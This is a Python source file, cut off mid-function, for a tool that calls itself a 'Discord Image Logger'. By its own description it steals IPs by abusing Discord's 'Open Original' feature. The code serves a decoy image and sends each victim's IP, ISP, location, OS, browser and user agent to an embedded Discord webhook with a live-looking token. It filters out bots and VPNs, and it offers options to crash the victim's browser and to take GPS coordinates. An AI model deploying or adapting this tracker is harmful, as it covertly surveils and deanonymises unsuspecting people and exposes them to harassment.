# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1159107099079475353/-MNUUeWJPcwqJIlXh03rh8TqNQ4IR0xyer2P6XFYh39tFUUKUdSABQYhrEg-1eoiBkS_",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHCBQUFBQTFRUXFxcXGhcbGxsYGBgXFxgXGhcYGBcXFxcbICwlGx0pIBoXJTYmKi4wMzMzGiI5PjsyPSwyMzABCwsLEA4QHRISHTIpICIyMjIwMjIyMjIyMjIyMjIyMDIyMjIyMjQyMjIyMjAyMjIyMjIyMjIyMjIyMjIyMjIyMv/AABEIAOEA4QMBIgACEQEDEQH/xAAbAAACAwEBAQAAAAAAAAAAAAAABQMEBgIBB//EAEsQAAIBAwIDBAYGBQcKBwAAAAECAwAEERIhBTFBBhNRYRQiMnGBoSNCUmJykUOCkrHBFSQzU3Oi0QcWNFRjdIOTo7MXNbLC0tTh/8QAGQEBAQEBAQEAAAAAAAAAAAAAAAECAwQF/8QAJREBAQACAgIBAwUBAAAAAAAAAAECEQMhMUESIlFxMmGRobET/9oADAMBAAIRAxEAPwD7NRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQFFFLLzjtrEdMlxCjdFaRAxxjOFzk8x0oGdFJW7S23RpW80t7iQftJGRXq9pLU83dPOSGaIfm6AUDmvKRf528PI2vIGP2UkV5CfARqS5PkBmqknHJ5toEEMf9bcKxdh/s7cEMPe7KRj2TVkt8DUV7WVjtZ23/lK4z/Z2ej3ae5zj9bPnVpJr6Pmbe5XPTXbSAe4mRXb4oKtxs8jQUUi/lyb/AFC5/wCZZ/8A2KKzoPaKKKAooooCiiigKKKKAqGaVUVndgqqCWYkBVAGSSTsAB1qWsx2jbvp47XmiKJ5R9r1isCMOql1kc/2SjkTVxm7oDcfml3togIznEs+pQ3g0cK+s6nxYp5ZBzXiz3uN54dXlbOF/Lvs/Op8V7XqnFjGdoF4lfKN1tpj5d7bfv72rEXaVAwW4je3LEBWfS0LE4AAlUkKSSAA+kk8ga5Y43O3vqIvHJqjyj7YZchvVboy+B86l4cfRtpWYDmQPfQpB5Vn+yrMgmtmJYQsvdknJELqGRSeulhIg+6i9c15xHtBiRoLWP0icYDjOiGInkZpsEK2M+oAWPgBvXms1dNNHXlZVuD3cozdXzoD+js1ECjy71tUje8MvupReQpBJ3dtc3z3Gx7uOZrnnyMqzkoinHNiuehpMaN+zAAk7AdaQy8ZeYfzYII/9Zlz3R57woCGm6b5VN8hmxis5dcB4jfIUv7mOKPb6K1VxnGDqZ2bc9CrB12yKpy/5NrFt3a4lb7UkpLfICt48dqbaWS3gf8AppXujvkO/wBHgnOO4TCEDkCyk+ZqaC9jjGiKNI1HIIqoPyUVkf8Aw6sANkcEcmEjBh7iuPnVWfsreW41Wd5IQN+7uPpEPkGx6v5fGu045PMTbdNxdqrS8TY8mrC2Hahu8FteR+jzcgT/AET+aseWfeR552pxxG9EUZkILHIVVHN3Y6UQeZJA8uddcZhrcTtY4nxaOIq75aV8rGqKGlkPVUHP3k4A6muLb02X1nMcCnkgHey/rOSEU+QDe+ueA8GZC00xD3Eg9duiLzEUX2Yx8zua0scYFAqS0nG6yhvKSMfIoVx86vpJIEy3qt1AbUPgcA/IVZocZBFNRC/+UZPGvK69Hoq/GfY3Wyooor57oKKKKAooooCiuHYAEkgAbknYADmSaz0PF55k9It0jMWT3ay6laeMfpFcf0YY+zlWyACcavVSbGjrIwkyTXkmfak7tSOarFGqEb9RJ3p+NNuH9oIZWEbaoZj+ilASQ456N9MgGeaFhSfg2NEhHW4vCfxely6vnmuvDPqSvn/aSye3AVILq7kVgGllkumZgVLaoViIVVBwMk5z0PtVpuxltIgd3MpLbfSSyui6TsqLJuNiDn3jpWqor0TDV2zt8v7W9n5O+aWO0aUks2gtLIhzIwDAbqpIGojIxkDFaDslwKJGS49Ea2lVFBwzhHLp9IrRuBgqeoGDtgkZA1ruFBYkAAEkk4AA5knoKhjudUjIoBVFGps/XbdVH6u5/EvnUmEl2bKrhpjeSwxN3Qlgg7yUEao40luARGpG8j68BuS6SeeAdHZ28VvEIolCIm4A3JOclmJ3ZidyTkknesrf3qx3rgsATbxYBIGcyz8vHlXXE+ISGMohIeQrGhHMPIwQNj7uS3uU1m8W7auzOW+kvHaOBzHChKyTD2mYbNFBnbI5M/Q7DJyVc8P4fFboI4kCLzPMlmPNnY7ux5liSTXPDLJIY0jQYVAAB5AV3cy9BWZju6io55c8qhrwmuGkrvJplJXjCq/fiu1mFXSE/GeFQ3ChJkV1ByM8wfEEbis3Y2skVxFDMskkMTO0MipJJnUuiNJNAOGQNINTYGMGtBxbiAjGo5YkhVUe07nko/x6AEnYVLw9221kFjuccgfBfIcqXGU2cRoBUtcINq7qgoorwnFBzooqL0pa9oNRRRRXznQUUUUBRRVe6uEiR5XIVEVnZjyCqCzE+4A0Gd7SObmZOHISEZRJdMCRiAEhYsjrKwKn7iv4080ADAGANgBsAByApL2Tt2MT3UgIlu375weaIQBDGfwRhBjx1U5d8VvCIp31ukilZEV18GUMPLY1l9Rs5Bvm2kkIII9aGWVshg31o3c4IOSGcHONg+v79UBLEADcknAA8STSG+cXkE0aKVV0ZVdvVJbHqui88BsHUcctvGvTMev3ZP5VJVgDpJBAbAOk42ODsceFUzaSnb0hh5iOIH5qR8qVcI41cSQxySRRvqX1u7kKssikrIhjcYBVgw9vpVhO0SEsrQzKVxnKxtzGR7DnNa3tFs8JRsd7JLLjfEjDQT96OMKjfEGrVtCU153LuzHHngKPgoUfClM3aNRpCQTOWOBkJGucE7l3B5A8gaX311dTAqzLBGcgrES8jDwMrAaARz0rnwar+IqrN3dzNcyMivGWEKagGDLDqDHBHLW0g/VBrjgdhi+jjjLiOIGQq5Z0UkFCyBt02bQuDg5kwPU37Z0t0ycLGi9OSqo5Ae6nfY62ZUeeQYlnIdh1RAMRxfqrz+8zHrUznUnsjUvJgVUClqmWMufKr0NuBXP5TBplbye9XOiyVx/vCKT8CmPnSC67VmI/zm0uIB1fSssY97oT+6vpcqbUlubQ5Jphnb7TTNWfGIZ11RSJIOuk7j3rzHxqY3JFVOMdkraUmTu+7k5iSI924OMZyuxPvBrP3BvrTOr+dxjO4GmdeeMryfpy3rtMrPMZ0ZQv3szyndY8xx+Gr9K/vz6nlobxppbPg5rN9mL9JIiqtqMTshOCpYBiVdlO4LDc+eaeIa3hqzc9h5He1Ot2KQ66X3XFO4cNIwET7Bjt3bgE4Y/ZYA4J5EY6jCyQbPvhjOazPH+PMW9GgwZWG55rEh/SSfwXqfKkj8bmujotQVj5NO49Uf2SHdz5namHDOHJCulMkscu7HU8jdWduprEm/Ao/wAhN/rdz/zB/hRTvuzRWvhB9Looor5roKKKKArC9peMLd3EfColZgzhrmQf0aRxFZJIc53Y+ojdB3mNzkB92qvJI7crAQJ5mWKInHqu/N8HnoQO+N/YrO9jeHRx97MmWTPcRMd2eOJj3srHq0kxlYnqAtaxx3RrpJMUq4pxFY0LE/xJPQAdSamlkzWZ4/fLEjysrMqAthRltvAfx6b168MJPLFpbxC4UK1xckBE9YId1XwLD67+HnyqnwTjT91JeTKQJXVYIxvI43VFUeLE5/M8qx1pcT8SmQTiQQqdlijZ11H2SxwV2yMlugxjc19TsODtrjklZZHjVgmlNCKW2LhCzetpAXOdhqxjNWZfLueBx2aJltu8YBXeSUuijCxuJGV0HjupyepJPXFVuKRmNhKeQ9V/wE7N8D8iau8F+iury2PJmS4T8Mo0yAe6RGP64phfwhgQRkEYIPIg8xWsL1pKQXiaVV/svGfgWCt8mNWrhOlQpasI5IDvhSEY9UI9TJ8V5H3A9atOpNbgRTW/pE6Q844iskngz5zFF58tZHknjW94fbHApVwXhygsVGNTFm65Y8ySfcB5AAdK1kEeBXHlz+P5WOoo8VMK5Jr0V5Ldto5DVSQVakNVZDXTBKX3MeaT39r1p053qC4TKmvVjdMPnXG+FyIzXVrhZlHrLj1ZlHNWUc28Dz6e6Oz41eMiOtmrq6ghknQKc+IYZHurUzjBpRwWEI9xED6ok1Kv2RIocgeWvWatx1errYWC8vpZHhAhtyqqxzmZ8OWC6eS/VPyqrdcEUT2vevJOzvJq7wgphYmICxj1VGrB+FPuC2jyXd5Lj1VMUSnxKLqf5vijjBVL2xjPtOZjjwURMMn4/uNZ1LN37qvQxdAKbWdh1NRWygGmsBrrlUHo6+Fe1PRWN0aGiiivnOgooooMH2wvZGmMcRxJpS2hIPsz3OWmkK+McCKwP+0I606it0ijjhjGEjRUUfdUAD91Z7hSGbiV5Owwls8ka8vWmkCCR/eIo4U+JrROcmvRxY+2a8YbViu3rMtnNp9p9CD9d1Q/Imtk8gBC9Tk/Acz8wPjWP7cHIs48Z7y7gB/CCzH91d8r1UOOF2KxqiKoCoAAAMAYHhTlFwKqwHerqITWr0hXxKyczW9xGMvGWjcbDVDJgPz+ywR/1SBzphImaYxWnjVpbYDpXG8sxXTJ8TsZWjYRMEk2KMwyuQQdLj7Jxg43wdqpcK4dKC80+BLJtoViyRRr7MaEgZJ9pjjcnwArbSw0tuYcb1ceSZXZpPw+MKMVDx/i5h7mKPBmnfQgPJVUapZWHUIu+OpKjrSu+vnQB4/WdN+7z/Sr1TfYMfqnxx0JpRZ8TS5v5Jx6yR2sSpkHYzO7ybcw2EUHO404rnyY21Y38DZGamqpbEBRvn+NSNcL4nw5Hn4Vys7V69VJTUzyeII9+KqSvtXXCJVc1HO2BXZqjdyV6JGSy79qlXDf9MuFwf6O3Pv9aYZHyHwpjPJk1R4Kwa5uW+yYo/2Y+8/fIa3l6Gut4wq7ADmdhjc7k1h+0No6SJeSY1+kwqoByI7f14lUnxJkZz5sB0zW8TlWc7V2nfW80Y5sh0/jHrIf2gKxlNqmjfem9sayXBb/AL6GOXqyjUPBxs6/BgRWpsHyK1bubRdorzNe1kaGiiivnugrP9sO0kfD7Z53wXwRGmd5JMbD8I5k9B8AWPF+JJawvPITpUcgMszE4VFHVmJAA8TXzPjFjJcT2i3QBuLqTW6e0lvaQ4lMCnlktoDP9Y56CrJsafspZvDZxiQkyyapZScZMsrGR848C2PhTCWRUVnYhVUFmJ2AUDJJPgBUjmknFR38sdoPYAEs/wCAN9HEfxupz4qjjrXsxnxjFTWDsyNO4KtLgqp2KRDPdKR0bBLEdC5HQVnO1LZm4f8A7yP/AEPWsvmwKxnal8NZP9m6iB9zh1/eRWrPpQ84rftFbyyIMuFwg8ZHISMfF2WtXwThwhijjyToUKWJyWIHrMT1JOST51jr8amsoukl3ET7o1km/ei19EhG1cebL01HYFDV7UbtXnactSy/fTq57gY67jNX3elF5J+fSu3Hj2zayzpryGTO+SXUcwSfz5e6ltrElve619WO7Kgn6scw1EKen0mokfeX71POJKckDl0APPp/+0vvLISRmA7I4xnProRgq6eYI1Zz0FeizcRt7SVQAc5wAM/JgfyqSQ6SC67bnPMZ25+e2azPZTijNB3bg99bsIpB9pxgq/ucEPnzPhT0XLMozgA7gDf1ScY8q8uU7admTO7AgDdRz55wfkai1E5yMHP796jEpwNbjO4/L2SvjsfnXMkwUDJ3+ZPU1244lE74FKLmbOa6ubkmqhFeiRlA5AyTsBuT4AczVXsYpeNpiMd9JJJvz0ltKf3FWqHH5WmdbCM+vIMysP0cP1s/ebkB51peDOokkgVQqwrEBjwZWwMdMBR+dZuW7+A/XlSviK7U0FLr8bGk8jEQk21z3ePorlmZTn+jl0kuuPBsah56q23CX2IrH9pU+gdxziKyr70YMfkCPjWo4W+9Na3A8oqPXRWRpaKKTdqOJtbWssqDMmAkS/amkYRxDHX12XPlmvA6EzN6ZdvId7eycpGOkl3giSTwIjDaB4MX8BS3hZ77iV5OfZgSO2TfbUfpZdvHJQfCnUVsllaJDnKxIS7HmzDLyOx8WbUx99Juw0RFmkjD17hpJ398rFx/d0D4V348fDNPp5lRWkchVUFmJ5BVGST8BSzs7E3dtPICJLhu8YHmikARRnw0xhQfPUetcdoh3gitR+nkAf8AsU+klz5MFCf8SnVd/aF/EXrGdsGxbGT+reJ/2ZEyfyzWt4k1ZPtUM2lz+BvlvXSz6ansya4X0vhqlhkzyEDO5Ho8q5x4ZIHxr6Yh2r4nYq4tl4hIPpEkgnwN9EEb40L+o0jHxLGvtELgqCDkV4+Xu7bjp3qHVXUlQs1TGCC6nxkeW1KRMSRkYzv+LbOAfgfyq9cNvnwqq0QJ57A593uPhXoxmoyo8QhHtrt446jGSR50oZyihxvuPV8Vz08Tind6mFAB9/h5YFIyyqcHw+GOR91dZEdCXuJorwexJphuQeWlm+ikI+450k/Zc+Fat5ea7AZz+X+ArJlVZGR8OrqVIPJlYbj51LC7hB3jD1MAux5gbAt0yds+ZNc8uPva7X7y9VSWGTnkBueQGfKqMFyWBJ28MnpgH+NdSaWyQ6nPgwx++l9/eWluNUs0anngNqcnmcKuSa1NYoZBSaTdpOOLb4hjxJcP7KfVjB/SSEeyo8OvzruK4vbz1bSI20R53E64cjxii5nyJ+VNLLgMVmpCamkbd5HOqR28WY9PKpc7l1P5XRR2YtYkR2WVZpZGzLIGDFn8NvZUcgKtdkuJrLd3yqrnS6KWwAq93GE0nfJJcSYwDsN8ZGfeJWUbBpD6kiKSJF2dcDO5+su26nY1R/yVWbiGa7fGblyw58lLAnfxYt+VTLqyQb8nFLLx8g1LcT1RlfY10kQk4kAU0HfvGVMeIZhq/u6j8KdcOrNw3azXbIuGW3XJI3HevlcZ+6gf9o+FanhyVd72L2aKk0UVkaisvxo99f2Vv9WIS3TjzQCKHP60jt708q1FZm2jP8o3kh6QWsa+Q1Tuw/NhXz46E3+UG4Po0kan1pjHAvvldUP90sac28QRFReSgKPcBgVnuNN3t5ZxdEaWdv8AhoI0/vSA/q1pUG1evCMUotx3l7NJsRBGkS+IkfEsv93uPnTdjSvs9vE0hxmWSWTI6o0hEX/TWOrty+BW8QqvnyayfbSfTZznxAX9plB+RNaWfc1ke2ba/RbYbmWZCR9xPaPzB+Fby6xqTy0thGpjETjKtGEYHkVK6SPyzTzsNxBu7a0kOZbUhCTzeLH0MnnqTAJ+0rUiBryeORXW6t8d/GNOknCzRk5aFz0Od1bo3kTXPl49zc9LK+iOaqSvVPg/Go7qPXGSCDpdGGmSJxzSROasPyPMZFSyvXLDFajJqJ0IOofEH99SVWuLgDrXeRlSvlG4zz8Nt+tKZAMbCrdxNmqygAZY4A3JJwAPEmukg9hjO2PA0p4zeTPHOtoqv3G8hYZWRlIZ4kH1tIGG8csvPcXYJ3uMrblkiPqtPjGroUtgR6xP2z6o6ajy03DLBIo0jjAVEACqByxkHPn4+e9csrvqLCnsja8PvIUuY7aAMfbVY0ykn1lbAHvB6gg1pU4VAm6RRqfEIoP54r5L2itLjg136daD+byt6yb6AScmNx0BOSrdM49/0bgfaSK8hWWI+TKfajbqrD+PWuOPd17aN5HAG9IruXUatXM+dqXSuqguzBVAySTgAeJJr0YzTCjxtMwOpIAfSjE/ZdgrD3kEqPNhTwIIo0jXkigfkNzWWQ3F7Kj28aejxHUkk2oRySjlIIxhnCfV5DO+dhU9xY3kYyt2sjD6kkX0Z8gwYuvvJas/LeW5FNp5woLMQAOp8zgfOsnccWmvZms7LZQcTXP1Y1+t3Z8eYB5npj2hWvjccRmSw0GAL9JO2dXqKRp0EbMCSMdcjcDG/wBA4dDb2sZgjURpEgcj7uCS7HmTsSSfGpllcup4NM5bdlLQzNDEskccEaCRo5JEaWVwCocq2Mqg1Hb9ItaFOz1svKM/GSU/veouy0Z9HWVxh7hmnfIwR3h1Ip/DH3a/q06pjJoLv5Gg+wf+ZJ/8qKv0Vehoqz8co9LvE6hLdvgyyqD7so35VoKwn+UQSJoaAgPeAWZx7QDMZFlBzyRPSPjIp6V4Z5beWVmTcyTsQQyRxpg5wgLOx95ZvyQU5cEqQNiQQD4HFV7G1WNEjQYVFVVHgqgAD8hVl+Ve6eGCns7OvoluAMaI0jZeel4x3bp7wysPhXdzNqo9FVC7KMa21NucFsAEgcgTgZxz50k412itrUHvJBr6ImGkPgNI5e84FWaxnaLtw6orSOwVVBLMdgAOZJrFcC1Xl1JfFSIowY4Aev2m/In9rHSpn4fecTIacNa2YOQh2kkxyLA/vIwOgPOtPFAkaqiKFRBhVHIAVJvO/tP7Xw8C1PDsRUYrie7SJGkdtKICWPkPDxPlXaog4whe9soYC0dxLrLzJ7SQpgnWvsuDhgA4IB/KnXERxK3XPcJdqpGWhPdyFfrEwuT62OWlmydsDOR12A4Y7a+JTKVluFCxIQMxWoJMa+99nP6vLetvXzsuS/K2N6fK17cWrg6WlGDhgYZSVPVW0qQDUL9o429iO4k/DBIPm4UD4mtj2j7Ix3BaeEmC7wcSpsJCBssy8pF5DJGRgYO1Y6HiEsZRbiJm1F11xAtpkjGXjkiPrJIBvgFgR6ykjeu/Hy783SWI/SLyTOiBIV+3PICR592mfmwqDi/AmMcffSPNJJLDGoOEiXVIC5WJdjhA5yxY7U/g4zZn1GliBbbTIQhPiCsmM1Tv+B6lRrSbuxG6yJG2JYA6ggBR7SKQzLhTjB2Ga6Zdz7o0bkDAG2OQ6bctqljuABv7/wA6yq9ogrBLhTbyHYazmNz/ALOX2T7jhvKmIkJGc5Hj0rUkqGN9LG6NG6h0cYZWGQQehFfNrnhMvC5fS7Yl7fOJY+bCMnx+sF6E7jrkZNbkZNWRYmRSmjWWBGk7LpIwS56L++s54463fJKRf522YCkyNqYAqgjk1sDy0rpyc+PKmEXATehZLoFY9ikGeXXVKRzkx9Xkvmd6W3nZy4sEhnilkuI7clnt2YsBHpZWNvqJ0lVYnSeenbHI6ay47DNCs0Th0YbeIPVWHQjwrEyuXVXSxdSLGgRQAAMADYADkAPCs9cTljUl3dFzk1mO1nFhBCyqcyyeoig+v62xYDnsOXmRXbrDHdRV7KdqLaK7vLi4kKCQokfquwMalhkaVO3qg/GrPaniJfiIgifUt3bRRDSdiJZgHb4IGrRdl+ApDYxwzRozSAO6MoIBIyFIOdx18yaR8J4DFHxZe7XCRq7gcwpKAY8gC5xXnsy1+Wn0dVAAAGANgPADkK6oorsyKKKKrTQViuO/S8UgRvZt7Z5V85JpDFnH3VRv262tZHtrAYjDxBAT6PqWYAZJtZMd42BudDKj+4NXgwsmUtaXKDXiOGAZSCpAIIOQQRkEHqKp3d4F2Fe6OaS7hRlKtnB2OGKn81IIpbYcFtIDqjgjRvtBQX/bO/zqG54gFBd2CqoySTgAeJJqtwyS8ugZILY9yfYeVxCkg/rBsz4PT1MY3zvgMvjj+pYZ3s+dqXNV3+QuItjMdoPH+cSkj4ej7/nUv+Z1w/t3axr9mGL1vMd47H8worP/AGwk8nxpVdXEcSa5HWNR1YgD4Z5mueE9m5OISpLcxslnGdSRONL3Djk8iHdYx0U7nwwa1/B+yNnbMJFj7yX+tlPeS58Qzez+qBWgrhyc9ymp4WQV7RRXBoUh47wMTZdMLL6uegk0nKaiOTr9VumSNwSKfUUGGW2huw0VzDG0qe0siLq/Euf4H3bYNVIezFtbsXigVSeq5yfzOBWy4lwtJsMcpIvsuuzr/iPI0puL/uCEugEzssoH0T+GT+jbyPwJrvx8k9pYzl5OMFZLaYqeY7oSqR7kLZ/KkgsLXP0UV/CT/Uw3SLn8BXR8q+jYUjK4IPIjcEeRrnNd79TLAG2njBkL3qxx4LGZ7aPUMgBUVEZyzEhRnTuedfRrJBHGoPPA1HJJLY3yTuazPag63sYj7L3SM3mIkeVVPvZV/KmN3fY2zWfhuixf3wGa+U9p45LKQ3VqQkcjASoRmMMeT6RuAcnl1x44razSlqzHaBnuJI7GMA94w7w89Krh+XgBgk+ajmdt5YyT/CU04Zwq/uYwzTW0cbcpIdcjMORKBsKPfvT/AIP2VtLXDrHrl5mWX15Serajy+GKh4STaHuMkxE/RseaZ5xsf3Gm88pIxUxxt8iC4lySelIOx83e3V7L0HdoPjqY/IJVq9nZ29Hi/pGHrtzESHmx+9jkPGu+ylusbXmkYX0jQv4Y4Yoxn4g1cr3IkaSiua6rQKKKKNNDXDKCCCMg8weVd0V85piZ+zlzbZFkVeAnPo8rFDGTue4lwfV+4wwOjDlSSZrgNoe0uVkIyFEfeKfdKhaMfrMMdcV9Qorpjy5YpYwNj2INwyS32NCYK2ysWTVnIadhs55eqPVG+7A1vFUAAAYA5Acq7orGWVyu6ooooqAooooCiiigKKKKAqG4gSRWR1V1YYZWAZSPAg86mooMFe9hHiYycOu5LYk5MT/S27HwCtuufHfyxSi+h44hVvRIpJE/SQSqsciZ3jkikIY+IYYKnlsSD9Tr2tTPKeKPiXabjkkoNv6NcLcgoywlDrWTfRLFIhOMbnOCpAIOM1Z4LHxF00FEeQbu0zvC6lt8NHoOw5AoSu3vFfUeL8EgulCzIG0nKMCVdG+0jrhlPuNZ9+z9/D/o12kyDGEvFJYf8ePBP6yk+Zrpjy3e6mlfhvAGliR5ZCNQ3WId3g9VLnLbHI2Ir214Rb2pcQx6Wf23JZ5G/FI5LEeWa7huL+3R+8sjIuosPR5UkILEkjTJoJXPgMjPLbNLLfiN3cqXitlQFmXVNKuzIxRwUjychgRjyrrhnLe6liXi86RwySPjSFPPkTyA/PFcWVlM8a/zomIqvsxBZDtuBKxOV8GC/Gp7Xs8zOsl1IZWVgyoo0QoRyOj65Hi35U4nrr5ZVLS1jiXTGuBzPUsfFmO5Pvqn2eOElP2p5z/1CP4VeJqjwTZH/tZf+41NB6hrquI+Vd1QUUUUaaGiiivnNCiiigKKKKAooooCiiigKKKKAooooCiiigKKKKAooooCsZbqLe4mtCNIdpLiI9HSRy8qj7yOzZH2WQ9TjZ0m7RcGFzGoVtEsba4pAMlJACNx9ZGBKsvUE9cEawy+N2lV6gnqvwy+MgdHTu5oiFljJzpYjIZT9aNhurdR5ggWZ+Ve2Xc3GNKZqlwnbvR4Sy/Mhv41dNUrDaS4X7yP+0g/iprVDuI7VJUUPKpaAoooqNNDRRRXz2hRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQFFFFAUUUUBRRRQY/i/wD5pH/uj/8AeWrNxRRXr4v0pVI1Ttf9Il/BF/76KK0h1ByqWiipUcUUUUV//9k="
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

